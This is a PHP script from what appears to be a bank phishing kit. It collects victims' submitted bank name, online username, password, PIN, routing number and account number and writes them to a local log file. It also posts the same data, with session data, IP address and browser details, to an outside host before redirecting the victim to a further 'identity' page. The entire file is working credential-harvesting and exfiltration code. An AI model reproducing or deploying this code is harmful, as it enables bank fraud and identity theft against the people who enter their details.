<?php

session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_ip.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');


//
function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

//


$CountryA = ip_info($_SERVER['REMOTE_ADDR'],'Country');


$content = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP BANK LOGIN :</font>
  <font style='color: rgb(20, 158, 27);'>Add Date CARD:</font> $date       

                                                                                                                                                                                                                                             
   <font style='color: rgb(128, 129, 131);'>&#10112; Bank Name   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['bank']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; username or onlineid :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['username']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; password or passcod :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['password']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Pin  :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['pin']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Routing Number         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['RoutingNumber']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10113; Account Number         :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['AccountNumber']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$_SESSION['_LOOKUP_COUNTRY_']."</font>

   
   
   
   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt4.html'>identity</a></font></br>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']."</a></font><br> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
   
   ";




	
$f = fopen("../../users/tnt3.html", "a");
fwrite($f, $content);
		
fclose($f);


//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);

sendPost('http://www.save-test.epizy.com/sv3.php',$data);


//---- end request----------------



		
	
HEADER("Location: ../identity/identityc.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

	

?>